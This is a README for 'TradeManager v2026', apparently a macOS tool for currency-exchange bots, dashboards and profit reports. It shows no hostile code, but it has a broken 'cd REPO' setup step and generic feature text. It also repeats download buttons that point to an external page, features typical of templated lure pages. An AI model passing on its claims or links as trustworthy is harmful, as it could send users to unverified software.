# TradeManager v2026 - currency exchange transaction management system 2026

> **TradeManager is a macOS-oriented platform for managing currency exchange transactions in 2026. It connects WhatsApp and Telegram bots with a FastAPI backend and administrative dashboard to handle payment interpretation, order follow-up, profit calculations, and risk checks.**

[![Platform](https://img.shields.io/badge/Platform-macOS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/fishernathanpzms2272/trademanager-profit-risk?style=flat-square)](https://github.com/fishernathanpzms2272/trademanager-profit-risk)

---

<p align="center">
  <a href="https://fishernathanpzms2272.github.io/trademanager-profit-risk/">
    <img src="https://img.shields.io/badge/Download-TradeManager%20Latest-brightgreen?style=for-the-badge" alt="Download TradeManager">
  </a>
</p>

> **[Download TradeManager v2026](https://fishernathanpzms2272.github.io/trademanager-profit-risk/)**

---

[Download Latest Build](https://fishernathanpzms2272.github.io/trademanager-profit-risk/)

---

## What TradeManager Does

TradeManager gives currency exchange teams a centralized workspace for payment intake, customer order handling, and profit review. Messages received through supported chat channels can be processed by bots and surfaced in a web dashboard, turning scattered transaction information into an organized operating flow.

It is intended for workflows where payment descriptions, order identifiers, and exchange activity come from several sources. Automated parsing, risk visibility, and reporting features help operators spend less time sorting messages manually while maintaining a more dependable view of ongoing activity.

---

## Core Capabilities

- Connect transaction workflows to WhatsApp and Telegram bots
- Run service and API operations through a FastAPI backend
- Manage daily activity from a web-based admin dashboard
- Parse payment messages automatically for relevant transaction data
- Follow customer orders associated with exchange transactions
- Calculate exchange-rate profit for settlement and review
- Monitor trading-related risk indicators
- Use AI fallback parsing and generate daily Excel reports

---

## Getting Started

First clone the repository and move into its project directory:

```bash
git clone https://github.com/fishernathanpzms2272/trademanager-profit-risk.git
cd REPO
```

Complete the remaining setup for your macOS environment, then start the application components. For installations containing a backend service, run the FastAPI application before opening the administrative dashboard in a browser.

---

## Typical Workflow

TradeManager can be used through the following operating sequence:

1. Link a WhatsApp or Telegram bot with the relevant communication channel.
2. Receive payment messages and convert their contents into transaction records through parsing.
3. Use the dashboard to inspect customer orders and calculated profits.
4. Review risk monitoring information for activity requiring attention.
5. Examine or export the daily Excel reports for operational records.

When working through an API integration, direct the client or integration layer to the FastAPI service and use the dashboard as the primary interface for reviewing operations.

---

## Settings and Environment

Deployment settings are generally supplied through environment variables or local application configuration. Depending on the setup, this can include bot credentials, dashboard access information, exchange-rate sources, report locations, and parser options.

A sample configuration layout is shown below:

```env
BOT_PROVIDER=telegram
API_HOST=127.0.0.1
API_PORT=8000
REPORTS_DIR=./reports
ENABLE_AI_FALLBACK=true
```

Use the names and values required by the particular deployment rather than treating the example as a complete configuration.

---

## System Requirements

- macOS
- A Python environment capable of running the FastAPI service
- Credentials for WhatsApp and/or Telegram bot access
- Storage for order data and created Excel reports
- Network connectivity for bot traffic and exchange-related information
- A web browser for the administration dashboard

---

## Frequently Asked Questions

**How can I find newer versions?**  
Review the repository history and available release files periodically, particularly when bot processing or reporting behavior is updated.

**Where should configuration be defined?**  
Configuration is normally provided through environment files, local settings, or deployment-specific values consumed by the FastAPI service and dashboard.

**What can I check when parsing results are unreliable?**  
Compare the incoming message format with the parser configuration, and verify whether the AI fallback options available in your installation are enabled and configured appropriately.

**Do I need to connect both bot platforms?**  
No. The integration supports WhatsApp and Telegram, so you can connect the platform that fits your operating process.

**Which directory contains the reports?**  
Daily Excel files are generally saved in the report directory specified by the configuration.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
